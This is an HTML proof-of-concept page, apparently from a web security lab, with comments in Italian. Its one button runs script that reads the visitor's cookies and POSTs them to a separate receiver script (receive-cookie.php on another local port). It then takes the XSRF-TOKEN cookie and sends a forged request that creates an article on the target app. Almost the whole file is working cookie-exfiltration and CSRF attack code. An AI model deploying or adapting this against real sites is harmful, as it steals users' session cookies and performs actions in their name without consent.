<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Send XSRF-TOKEN</title>
    <script>
        function getCookie(name) {
            let cookieArr = document.cookie.split(";");
            for (let i = 0; i < cookieArr.length; i++) {
                let cookiePair = cookieArr[i].split("=");
                if (name === cookiePair[0].trim()) {
                    return decodeURIComponent(cookiePair[1]);
                }
            }
            return null;
        }

        function sendCookies() {
            // Recupera i cookie
            const cookies = document.cookie;

            // Crea un oggetto XMLHttpRequest
            const xhr = new XMLHttpRequest();
            const url = 'http://localhost:8001/clickjacking/receive-cookie.php';

            // Apri una connessione
            xhr.open('POST', url, true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');

            // Invia la richiesta con i cookie
            xhr.send('cookies=' + encodeURIComponent(cookies));
            sendCsrfRequest();
            // Notifica l'utente
            alert('Cookies sent!');
        }

        function sendCsrfRequest() {
            const csrfToken = getCookie('XSRF-TOKEN');

            // Verifica se il token CSRF Ã¨ stato recuperato
            if (!csrfToken) {
                alert('CSRF token not found!');
                return;
            }

            // Genera dati casuali per l'articolo
            const articleData = {
                title: 'Random Title ' + Math.random().toString(36).substring(7),
                slug: 'random-slug-' + Math.random().toString(36).substring(7),
                subtitle: 'Random Subtitle ' + Math.random().toString(36).substring(7),
                body: 'This is a random body text ' + Math.random().toString(36).substring(7),
                user_id: Math.floor(Math.random() * 10) + 1,
                is_accepted: Math.random() > 0.5 ? 1 : 0,
                category_id: Math.floor(Math.random() * 5) + 1,
                _token: 'r8atb68WD62zVWbbdhzXA2kL0e0rJlo9sfW6dp2Z'
            };

            // Crea un oggetto XMLHttpRequest
            const xhr = new XMLHttpRequest();
            const url = 'http://localhost:8000/article/store';

            // Apri una connessione
            xhr.open('POST', url, true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            // xhr.setRequestHeader('_token', 'r8atb68WD62zVWbbdhzXA2kL0e0rJlo9sfW6dp2Z');

            // Invia la richiesta con i dati dell'articolo
            xhr.send(JSON.stringify(articleData));

            // Notifica l'utente
            alert('Article creation request sent!');
        }
    </script>
</head>
<body>
    <button onclick="sendCookies()">Send Cookies and Create Article</button>
</body>
</html>
